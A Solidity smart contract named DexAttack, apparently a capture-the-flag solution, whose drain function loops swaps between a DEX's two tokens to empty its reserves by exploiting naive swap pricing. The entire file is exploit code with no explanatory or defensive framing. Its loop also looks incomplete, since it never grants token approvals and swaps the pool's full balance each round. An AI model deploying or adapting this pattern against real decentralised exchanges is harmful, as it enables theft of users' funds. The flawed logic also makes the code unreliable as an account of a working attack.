pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract DexAttack {
    IDex public immutable target;

    constructor(address _target) {
        target = IDex(_target);
    }

    function drain() external {
        address tokenA = target.token1();
        address tokenB = target.token2();
        while (IERC20(tokenA).balanceOf(address(target)) != 0 && IERC20(tokenB).balanceOf(address(target)) != 0) {
            uint256 balanceA = IERC20(tokenA).balanceOf(address(target));
            uint256 balanceB = IERC20(tokenB).balanceOf(address(target));
            target.swap(tokenA, tokenB, balanceA);
            target.swap(tokenB, tokenA, balanceB);
        }
    }
}
